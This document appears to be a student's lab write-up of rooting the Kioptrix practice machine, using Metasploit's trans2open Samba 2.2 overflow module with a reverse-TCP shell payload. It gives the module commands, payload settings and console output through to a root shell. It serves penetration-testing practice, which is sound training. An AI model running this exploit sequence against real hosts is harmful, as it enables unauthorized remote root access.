# ðŸ‘¿ Gaining Root with Metasploit (Kioptrix)

After investigating the Samba 2.2 using searchsploit, we discovered a potential exploit called "trans2open," which seemed promising. We proceeded to use Metasploit by loading up msfconsole and entering the command "search trans2open":

```jsx
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)

Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open
```

The search results provided several modules related to the trans2open exploit for different operating systems. We decided to use the Linux version, which has the index 1:

```jsx
msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/ba>
                                      sics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.179.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

However, before running the exploit, we needed to configure some options. We checked the options using the "options" command:

```bash
msf6 exploit(linux/samba/trans2open) > options
```

The critical options that needed to be set were "RHOSTS" (the target host):

```bash
rhosts 192.168.179.129
```

After ensuring that the options were correctly set, we attempted to exploit the target by running the "exploit" command:

```jsx
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.179.128:4444 
[*] 192.168.179.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.179.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.179.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.179.129:139 - Trying return address 0xbffffafc...
[*] Sending stage (1017704 bytes) to 192.168.179.129
[*] 192.168.179.129 - Meterpreter session 1 closed.  Reason: Died
[*] 192.168.179.129:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1017704 bytes) to 192.168.179.129
[*] 192.168.179.129 - Meterpreter session 2 closed.  Reason: Died
[*] 192.168.179.129:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1017704 bytes) to 192.168.179.129
[*] 192.168.179.129 - Meterpreter session 3 closed.  Reason: Died
[-] Meterpreter session 3 is not valid and will be closed
[*] 192.168.179.129:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1017704 bytes) to 192.168.179.129
```

The exploit attempted different return addresses and stages, but it appeared that the Meterpreter sessions were being closed:

```jsx
[*] Sending stage (1017704 bytes) to 192.168.179.129
[*] 192.168.179.129 - Meterpreter session 1 closed.  Reason: Died
```

This could happen for several reasons. One possibility is that the exploit caused instability on the target system, leading to the termination of the Meterpreter session. It could also be due to the target system's security measures detecting and blocking the malicious activity. Further investigation would be needed to determine the exact cause of the session closure.

In some cases, brute-forcing attempts might lead to session closures if the target system detects and responds to multiple failed exploit attempts. In the given scenario, the user interrupted the bruteforce process after identifying a potential issue.

Notice this part:

```bash
Payload options (linux/x86/meterpreter/reverse_tcp):
```

When you see "/reverse\_tcp," it means we're using a staged payload.

Now, let's pick the payload:

Here, we're choosing and setting up a specific way to deliver our attack. By going with "/reverse\_tcp," we're using a method where the target computer talks back to us. It's like giving us a secret entrance, letting us control things more sneakily.

```jsx
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/
set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
set payload linux/x86/read_file                       
msf6 exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.179.129  yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/ba>
                                      sics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)

Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.179.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
```

we can see that something new popped :

```jsx
Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   CMD    /bin/sh          yes       The command string to execute
   LHOST  192.168.179.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

if i understand well, the last exploit worked but we did not specify to do anything and now we specified we wanted a reverse shell and this option popped

```jsx
CMD    /bin/sh          yes       The command string to execute
```

which indicated that itâ€™s going to connect and then give us a shell, so if we run exploit now:

```jsx
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.179.128:4444 
[*] 192.168.179.129:139 - Trying return address 0xbffffdfc...
[*] 192.168.179.129:139 - Trying return address 0xbffffcfc...
[*] 192.168.179.129:139 - Trying return address 0xbffffbfc...
[*] 192.168.179.129:139 - Trying return address 0xbffffafc...
[*] 192.168.179.129:139 - Trying return address 0xbffff9fc...
[*] 192.168.179.129:139 - Trying return address 0xbffff8fc...
[*] 192.168.179.129:139 - Trying return address 0xbffff7fc...
[*] 192.168.179.129:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (192.168.179.128:4444 -> 192.168.179.129:32773) at 2023-12-05 15:46:55 -0500

[*] Command shell session 6 opened (192.168.179.128:4444 -> 192.168.179.129:32774) at 2023-12-05 15:46:57 -0500
[*] Command shell session 7 opened (192.168.179.128:4444 -> 192.168.179.129:32775) at 2023-12-05 15:46:58 -0500
[*] Command shell session 8 opened (192.168.179.128:4444 -> 192.168.179.129:32776) at 2023-12-05 15:46:59 -0500
whoami
root
```

We successfully rooted this machine gg!
